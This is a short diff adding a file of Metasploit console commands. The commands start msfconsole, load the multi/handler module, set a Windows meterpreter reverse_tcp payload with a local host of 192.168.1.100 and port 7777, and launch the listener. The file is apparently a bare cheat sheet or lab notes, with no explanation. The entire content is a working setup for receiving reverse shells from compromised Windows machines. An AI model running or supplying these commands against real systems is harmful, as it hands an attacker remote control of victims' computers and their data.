@@ -1,0 +1,16 @@
+msfconsole
+
+use exploit/multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+
+show options
+
+set LPORT 7777
+
+set LHOST 192.168.1.100
+
+exploit
+
+help
+
